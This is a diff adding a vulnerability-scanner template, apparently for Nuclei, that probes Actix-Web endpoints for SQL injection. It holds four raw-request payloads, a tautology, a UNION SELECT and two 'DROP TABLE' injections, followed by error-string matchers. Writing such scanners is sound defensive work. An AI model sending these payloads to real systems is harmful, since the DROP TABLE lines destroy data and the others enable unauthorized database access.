@@ -1,0 +1,51 @@
+id: rust-actix-query-injection
+info:
+  name: Actix-Web Query Injection
+  author: Guardian
+  severity: critical
+  description: Detects SQL injection in Actix-Web query parameters
+  tags: rust,actix,sql-injection,sqli
+
+requests:
+  - raw:
+      - |
+        GET /api/search?q=' OR '1'='1 HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /api/users?id=1' UNION SELECT NULL,NULL,NULL-- HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        POST /api/query HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"query": "'; DROP TABLE users; --"}
+      - |
+        GET /api/items?limit=100; DROP TABLE test-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "syntax error"
+          - "SQL"
+          - "ORA-"
+          - "MySQL"
+          - "PostgreSQL"
+          - "SQLite"
+        part: body
+
+      - type: regex
+        regex:
+          - "(syntax error near|unclosed quotation|quoted string not properly terminated)"
+        part: body
+
+      - type: word
+        words:
+          - "20 items"
+          - "all users"
+          - "id"
+          - "name"
+        part: body
+        condition: and
